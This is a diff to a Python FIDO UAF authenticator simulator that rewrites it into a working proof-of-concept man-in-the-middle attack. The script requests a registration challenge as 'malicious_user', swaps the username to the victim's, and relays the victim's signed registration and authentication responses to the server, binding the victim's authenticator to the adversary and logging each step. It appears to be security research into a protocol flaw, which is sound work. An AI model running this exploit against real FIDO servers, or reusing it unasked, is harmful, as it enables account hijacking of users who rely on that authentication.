@@ -6,6 +6,7 @@ import json
 import pprint
 import requests
 import struct
+import uuid
 
 from cryptography import x509
 from cryptography.hazmat.backends import default_backend
@@ -22,10 +23,11 @@ ENDPOINT_REG_REQ = "/fidouaf/v1/public/regRequest/{username}/{aaid}"
 ENDPOINT_REG_RESP = "/fidouaf/v1/public/regResponse"
 
 ASSERTION_SCHEME = "UAFV1TLV"
-KEY_ID = "malicious-user-key"
+KEY_ID = "malicious-user-key-" + str(uuid.uuid4())
 
 AAID = "EBA0#0001"
-USERNAME = "malicioususer"
+LEGITIMATE_USERNAME = "legitimate_user"
+MALICIOUS_USERNAME = "malicious_user"
 
 class AuthenticatorContext(object):
 	"""
@@ -39,7 +41,7 @@ class AuthenticatorContext(object):
 		# Initialize counters.
 		self.sigCount = 0
 		self.regCount = 0
-		
+
 	def generateCertificate(self):
 		issuer = x509.Name([
 		    x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
@@ -48,7 +50,7 @@ class AuthenticatorContext(object):
 		    x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
 		    x509.NameAttribute(NameOID.COMMON_NAME, u"mysite.com"),
 		])
-		
+
 		cert = x509.CertificateBuilder().subject_name(
 			issuer
 		).issuer_name(
@@ -66,13 +68,13 @@ class AuthenticatorContext(object):
     			critical=False,
 		# Sign our certificate with our private key
 		).sign(self.privateKey, hashes.SHA256(), default_backend())
-		
+
 		return cert
 
 class Authenticator(object):
 	"""
 	Abstraction of a UAF UAFV1TLV-compliant authenticator for registration.
-	
+
 	We override this class to make concrete authenticators.
 	"""
 	TAG_UAFV1_REG_ASSERTION      = 0x3E01
@@ -90,16 +92,16 @@ class Authenticator(object):
 	TAG_FINAL_CHALLENGE          = 0x2E0A
 	TAG_PUB_KEY                  = 0x2E0C
 	TAG_COUNTERS                 = 0x2E0D
-	
+
 	UAF_ALG_SIGN_SECP256R1_ECDSA_SHA256_RAW = 0x01
 	UAF_ALG_KEY_ECC_X962_RAW =                0x100
-		
+
 	def formatTag(self, id, data):
 		"""
 		Formats a single tag into a byte array.
-		
+
 		The data must be a byte array as well.
-		
+
 		Args:
 			id: a two byte integer representing the tag's type ID.
 			data: a binary array of data to encapsulate in the tag.
@@ -119,57 +121,57 @@ class AuthAuthenticator(Authenticator):
 	"""
 	def __init__(self, context):
 		self.context = context
-	
+
 	def getAssertion(self, aaid, fc):
 		assertion = bytearray()
 		assertion += self.formatTag(self.TAG_UAFV1_AUTH_ASSERTION, self.getAuthAssertion(aaid, fc))
-		
+
 		return assertion
-		
+
 	def getAuthAssertion(self, aaid, fc):
 		assertion = bytearray()
-		
+
 		signedData = self.getSignedData(aaid, fc)
 		assertion += self.formatTag(self.TAG_UAFV1_SIGNED_DATA, signedData)
-		
+
 		signature = self.context.privateKey.sign(assertion, ec.ECDSA(hashes.SHA256()))
-		assertion += self.formatTag(self.TAG_SIGNATURE, signature)		
-		
+		assertion += self.formatTag(self.TAG_SIGNATURE, signature)
+
 		return assertion
-			
+
 	def getSignedData(self, aaid, fc):
 		signedData = bytearray()
-		
+
 		# AAID
 		signedData += self.formatTag(self.TAG_AAID, bytearray(aaid, "utf-8"))
-		
+
 		# Assertion Info
 		assertionInfo = bytearray()
 		assertionInfo += 0x0.to_bytes(2, "big") # Vendor assigned authenticator version.
 		assertionInfo += 0x1.to_bytes(1, "big") # Authentication mode. Must be 0x01 for authentication.
 		assertionInfo += self.UAF_ALG_SIGN_SECP256R1_ECDSA_SHA256_RAW.to_bytes(2, "little")
 		signedData += self.formatTag(self.TAG_ASSERTION_INFO, assertionInfo)
-		
+
 		# Authentication Nonce
 		m = hashlib.sha256()
 		m.update(bcrypt.gensalt())
 		nonce = m.digest()
 		signedData += self.formatTag(self.TAG_AUTHENTICATOR_NONCE, nonce)
-		
+
 		# Final Challenge
 		signedData += self.formatTag(self.TAG_FINAL_CHALLENGE, fc)
-		
+
 		# Transaction Content Hash
 		signedData += self.formatTag(self.TAG_TRANSACTION_CONTENT_HASH, "".encode("utf-8"))
-		
+
 		# Key ID
 		signedData += self.formatTag(self.TAG_KEYID, bytearray(KEY_ID, "utf-8"))
-		
+
 		# Counters
 		counters = bytearray()
 		counters += self.context.sigCount.to_bytes(4, "big")
 		counters += self.context.regCount.to_bytes(4, "big")
-		signedData += self.formatTag(self.TAG_COUNTERS, counters) 
+		signedData += self.formatTag(self.TAG_COUNTERS, counters)
 
 		return signedData
 
@@ -180,7 +182,7 @@ class RegistrationAuthenticator(Authenticator):
 	def __init__(self, context):
 		"""
 		Initializes a new authenticator.
-		
+
 		Args:
 			context: an initalized AuthenticatorContext object.
 		"""
@@ -192,7 +194,7 @@ class RegistrationAuthenticator(Authenticator):
 		assertion = self.getRegAssertion(aaid, fc)
 		attestation += self.formatTag(self.TAG_UAFV1_REG_ASSERTION, assertion)
 		return attestation
-		
+
 	def getRegAssertion(self, aaid, fc):
 		"""
 		Returns the registration assertion tag.
@@ -200,30 +202,30 @@ class RegistrationAuthenticator(Authenticator):
 		regAssert = bytearray()
 		signedData = self.formatTag(self.TAG_UAFV1_KRD, self.getSignedData(aaid, fc))
 		regAssert += signedData
-		
+
 		regAssert += self.formatTag(self.TAG_ATTESTATION_BASIC_FULL, self.getAttestationBasicFull(signedData))
 		return regAssert
-	
+
 	def getAttestationBasicFull(self, signedData):
 		abf = bytearray()
-		
+
 		signature = self.context.privateKey.sign(signedData, ec.ECDSA(hashes.SHA256()))
 		abf += self.formatTag(self.TAG_SIGNATURE, signature)
-		
+
 		cert = self.context.certificate.public_bytes(serialization.Encoding.DER)
 		abf += self.formatTag(self.TAG_ATTESTATION_CERT, cert)
-		
+
 		return abf
-	
+
 	def getSignedData(self, aaid, fc):
 		"""
 		Returns the signed portion of the blah.
 		"""
 		signedData = bytearray()
-		
+
 		# AAID
 		signedData += self.formatTag(self.TAG_AAID, bytearray(aaid, "utf-8"))
-		
+
 		# Assertion Info
 		assertionInfo = bytearray()
 		assertionInfo += 0x0.to_bytes(2, "big") # Vendor assigned authenticator version.
@@ -231,69 +233,121 @@ class RegistrationAuthenticator(Authenticator):
 		assertionInfo += self.UAF_ALG_SIGN_SECP256R1_ECDSA_SHA256_RAW.to_bytes(2, "little")
 		assertionInfo += self.UAF_ALG_KEY_ECC_X962_RAW.to_bytes(2, "little")
 		signedData += self.formatTag(self.TAG_ASSERTION_INFO, assertionInfo)
-		
+
 		# Final Challenge
 		signedData += self.formatTag(self.TAG_FINAL_CHALLENGE, fc)
-		
+
 		# Key ID
 		signedData += self.formatTag(self.TAG_KEYID, bytearray(KEY_ID, "utf-8"))
-		
+
 		# Counters
 		counters = bytearray()
 		counters += self.context.sigCount.to_bytes(4, "big")
 		counters += self.context.regCount.to_bytes(4, "big")
-		signedData += self.formatTag(self.TAG_COUNTERS, counters) 
-		
+		signedData += self.formatTag(self.TAG_COUNTERS, counters)
+
 		# Pub Key
 		keydata = self.context.publicKey.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo)
 		signedData += self.formatTag(self.TAG_PUB_KEY, keydata)
-		
+
 		return signedData
 
 def main():
 	authContext = AuthenticatorContext()
-	
-	registerAuthenticator(authContext)
-	authenticate(authContext)
 
-def registerAuthenticator(authContext):
-	resp = requests.get(SERVER_URL + ENDPOINT_REG_REQ.format(username=USERNAME, aaid=AAID))
-	data = json.loads(resp.text) 
+	print("--- REGISTRATION PHASE ---")
+
+	# Legitimate user begins the registration protocol.
+	legitimateReq = SERVER_URL + ENDPOINT_REG_REQ.format(username=LEGITIMATE_USERNAME, aaid=AAID)
+	print("[1] {user} initiates protocol by requesting {url}".format(
+		user=LEGITIMATE_USERNAME, url=legitimateReq))
+
+	# Adversary begins the registration protocol.
+	hostileReq = SERVER_URL + ENDPOINT_REG_REQ.format(username=MALICIOUS_USERNAME, aaid=AAID)
+	print("[2] {user} initiates protocol by requesting {url}".format(
+		user=MALICIOUS_USERNAME, url=hostileReq))
+
+	# Adversary receives a response from legitimate server.
+	resp = requests.get(SERVER_URL + ENDPOINT_REG_REQ.format(username=MALICIOUS_USERNAME, aaid=AAID))
+	data = json.loads(resp.text)[0]
+	print("[3] {user} receives response from legitimate server:\n{data}".format(
+		user=MALICIOUS_USERNAME, data=json.dumps(data)))
 	
-	# Process the response.
-	# The response comes in a list, so we extract the dictionary at index 0.
-	header, challenge, username, policy = unpackRequest(data[0])
+	# Legitimate user receives response from adversary.
+	print("[4] Adversary modifies username to {user}".format(user=LEGITIMATE_USERNAME))
+	data["username"] = LEGITIMATE_USERNAME
+	print("[5] {user} receives response from adversary:\n{data}".format(user=LEGITIMATE_USERNAME, data=json.dumps(data)))
+	
+	# Legitimate user responds to adversary.
+	regresp = getRegistrationResponse(authContext, data)
+	print("[6] {user} generates registration response:\n{data}".format(user=LEGITIMATE_USERNAME, data=regresp[0]))
+	
+	# Adversary forwards response to legitimate server.
+	resp = requests.post(SERVER_URL + ENDPOINT_REG_RESP, json=regresp)
+	print("[7] {user} forwards response to the legitimate server and receives:\n{code}{data}".format(
+		user=MALICIOUS_USERNAME, code=resp, data=resp.text))
+		
+	print("[8] {user}'s authenticator is now bound to {adversary}.".format(
+		user=LEGITIMATE_USERNAME, adversary=MALICIOUS_USERNAME))
+	
+	print("--- AUTHENTICATION PHASE ---")
+	
+	# Legitimate user begins the registration protocol.
+	legitimateReq = SERVER_URL + ENDPOINT_AUTH_REQ.format(appId=AAID)
+	print("[1] {user} initiates protocol by requesting {url}".format(
+		user=LEGITIMATE_USERNAME, url=legitimateReq))
+
+	# Adversary begins the registration protocol.
+	hostileReq = SERVER_URL + ENDPOINT_AUTH_REQ.format(appId=AAID)
+	print("[2] {user} initiates protocol by requesting {url}".format(
+		user=MALICIOUS_USERNAME, url=hostileReq))
+
+	# Adversary receives a response from legitimate server.
+	resp = requests.get(SERVER_URL + ENDPOINT_AUTH_REQ.format(appId=AAID))
+	data = json.loads(resp.text)[0]
+	print("[3] {user} receives response from legitimate server:\n{data}".format(
+		user=MALICIOUS_USERNAME, data=json.dumps(data)))
+	
+	# Legitimate user receives response from adversary.
+	print("[4] {user} receives response from adversary:\n{data}".format(user=LEGITIMATE_USERNAME, data=json.dumps(data)))
+	
+	# Legitimate user responds to adversary.
+	authresp = getAuthenticationResponse(authContext, data)
+	print("[5] {user} generates registration response:\n{data}".format(user=LEGITIMATE_USERNAME, data=authresp[0]))
+	
+	# Adversary forwards response to legitimate server.
+	resp = requests.post(SERVER_URL + ENDPOINT_AUTH_RESP, json=authresp)
+	print("[6] {user} forwards response to the legitimate server and receives:\n{code}{data}".format(
+		user=MALICIOUS_USERNAME, code=resp, data=resp.text))
+		
+	print("[7] {adversary} authenticates using {user}'s authenticator.".format(
+		user=LEGITIMATE_USERNAME, adversary=MALICIOUS_USERNAME))
+	
+
+def getRegistrationResponse(authContext, data):
+	header, challenge, username, policy = unpackRequest(data)
 	appID = header["appID"]
-	print(header, appID)
 	fcp = getFinalChallengeParameters(appID, challenge)
 	fc = getFinalChallenge(fcp)
-	
+
 	auth = RegistrationAuthenticator(authContext)
 	attestation = auth.getAssertion(AAID, fc)
 	attestation = base64.urlsafe_b64encode(attestation)
-	
-	# print(data)
-	
+
 	regresp = dict()
 	regresp["header"] = header
-	regresp["fcParams"] = base64.urlsafe_b64encode(json.dumps(fcp).encode("utf-8"))
-	regresp["assertions"] = [dict(assertionScheme=ASSERTION_SCHEME, assertion=attestation)]
+	regresp["fcParams"] = base64.urlsafe_b64encode(json.dumps(fcp).encode()).decode("utf-8")
+	regresp["assertions"] = [dict(assertionScheme=ASSERTION_SCHEME, assertion=attestation.decode("utf-8"))]
 	regresp = [regresp] # We expect a list.
 	
-	# Respond.
-	print("Registering authenticator...")
-	resp = requests.post(SERVER_URL + ENDPOINT_REG_RESP, json=regresp)
-	print(resp, resp.text)
+	return regresp
 
-def authenticate(authContext):
-	resp = requests.get(SERVER_URL + ENDPOINT_AUTH_REQ.format(appId=AAID))
-	data = json.loads(resp.text)
-	
-	header, challenge, username, policy = unpackRequest(data[0])
-	appID = header["appID"]	
+def getAuthenticationResponse(authContext, data):
+	header, challenge, username, policy = unpackRequest(data)
+	appID = header["appID"]
 	fcp = getFinalChallengeParameters(appID, challenge)
 	fc = getFinalChallenge(fcp)
-	
+
 	# Authenticate Step
 	auth = AuthAuthenticator(authContext)
 	attestation = auth.getAssertion(AAID, fc)
@@ -301,13 +355,11 @@ def authenticate(authContext):
 
 	authresp = dict()
 	authresp["header"] = header
-	authresp["fcParams"] = base64.urlsafe_b64encode(json.dumps(fcp).encode("utf-8"))
-	authresp["assertions"] = [dict(assertionScheme=ASSERTION_SCHEME, assertion=attestation)]
+	authresp["fcParams"] = base64.urlsafe_b64encode(json.dumps(fcp).encode("utf-8")).decode("utf-8")
+	authresp["assertions"] = [dict(assertionScheme=ASSERTION_SCHEME, assertion=attestation.decode("utf-8"))]
 	authresp = [authresp]
 	
-	print("Authenticating...")
-	resp = requests.post(SERVER_URL + ENDPOINT_AUTH_RESP, json=authresp)
-	print(resp, resp.text)
+	return authresp
 
 def unpackRequest(data):
 	"""
@@ -338,7 +390,7 @@ def getFinalChallengeParameters(appID, challenge):
 	fcp["facetID"] = ""
 	fcp["channelBinding"] = getChannelBinding()
 	return fcp
-	
+
 def getChannelBinding():
 	'''Returns an empty channel binding object.'''
 	binding = dict()
@@ -347,6 +399,5 @@ def getChannelBinding():
 	binding["tlsUnique"] = ""
 	binding["cid_pubkey"] = ""
 	return binding
-	
-main()
 
+main()
